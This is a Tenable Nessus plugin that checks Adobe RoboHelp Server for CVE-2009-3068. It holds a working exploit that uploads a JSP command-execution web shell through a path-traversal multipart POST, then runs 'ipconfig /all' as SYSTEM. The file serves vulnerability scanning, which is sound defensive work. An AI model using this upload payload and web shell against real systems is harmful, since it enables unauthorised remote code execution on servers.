#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(41947);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2009-3068");
  script_bugtraq_id(36245);
  script_xref(name:"Secunia", value:"36467");
  script_xref(name:"OSVDB", value:"57896");

  script_name(english:"Adobe RoboHelp Server Security Bypass (APSA09-05 / intrusive check)");
  script_summary(english:"Uploads a file to run a command");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "A web application running on the remote host has a security bypass\n",
      "vulnerability that can lead to arbitrary command execution."
    )
  );
  script_set_attribute(
    attribute:"description",
    value:string(
      "The version of RoboHelp Server running on the remote host has a\n",
      "security bypass vulnerability.  Arbitrary files can be uploaded to\n",
      "the web server by using a specially crafted POST request.  Uploading\n",
      "a JSP file can result in command execution as SYSTEM."
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.intevydis.com/blog/?p=69"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.zerodayinitiative.com/advisories/ZDI-09-066/"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://archives.neohapsis.com/archives/fulldisclosure/2009-09/0410.html"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.adobe.com/support/security/advisories/apsa09-05.html"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.adobe.com/support/security/bulletins/apsb09-14.html"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Apply the patch referenced in Adobe's advisory."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
  );
  script_set_attribute(
    attribute:"vuln_publication_date",
    value:"2009/09/09"
  );
  script_set_attribute(
    attribute:"patch_publication_date",
    value:"2009/09/18"
  );
  script_set_attribute(
    attribute:"plugin_publication_date",
    value:"2009/09/30"
  );
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:8080);

dir = '/robohelp';
filename = string(SCRIPT_NAME, "-", unixtime(), ".jsp");
cmd = 'ipconfig /all';
expected_output = 'Windows IP Configuration';
  
# The exploit allows us to upload this JSP source which will execute as SYSTEM
jsp_source = '<%@ page import="java.io.*" %>
<%
Process p = Runtime.getRuntime().exec("' + cmd + '");
String output= "";
String temp = null;
InputStreamReader reader = new InputStreamReader(p.getInputStream());
BufferedReader stdin = new BufferedReader(reader);

while ((temp = stdin.readLine()) != null)
{
  output += temp;
  if (temp.length() > 0) {output += "\\n";}
}
%><%= output %>';

# Make sure the web page exists before making a POST request
posturl = string(dir, '/server?PUBLISH=1');
res = http_send_recv3(method:"GET", item:posturl, port:port);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

hdrs = parse_http_headers(status_line:res[0], headers:res[1]);
if (isnull(hdrs['$code'])) code = 0;
else code = hdrs['$code'];
if (code != 200) exit(0, posturl + " doesn't exist.");

# Construct and send the POST request (to upload the file)
headers = make_array(
  "UID", rand(),
  "Content-Type", "multipart/form-data; boundary=--nessus\r\n"
);

postdata = string(
  '--nessus\r\n',
  'Content-Disposition: form-data; name="filename"; ',
  'filename="../../../../', filename, '"\r\n',
  'Content-Type: application/x-java-archive\r\n\r\n',
  jsp_source,
  '\r\n'
);

res = http_send_recv3(
  method:"POST",
  item:posturl,
  port:port,
  add_headers:headers,
  data:postdata
);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

# If the upload didn't succeed, the system's patched
if ('<HTML><TITLE>Upload Status</TITLE><BODY><HR></BODY></HTML>' >!< res[2])
  exit(1, "The exploit failed.");

# Request the newly uploaded file to execute our code
url = string(dir, '/', filename);
res = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

if (expected_output >< res[2])
{
  if (report_verbosity > 0)
  {
    report = string(
      "\n",
      "Nessus was able to execute '", cmd, "' by uploading and requesting\n",
      "the following page :\n\n",
      "  ", build_url(qs:url, port:port), "\n"
    );

    if (report_verbosity > 1)
      report += string("\nThis generated the following output :\n\n", res[2]);

    security_hole(port:port, extra:report);
  }
  else security_hole(port);

  exit(0);
}
else exit(1, "Error requesting " + build_url(qs:url, port:port));
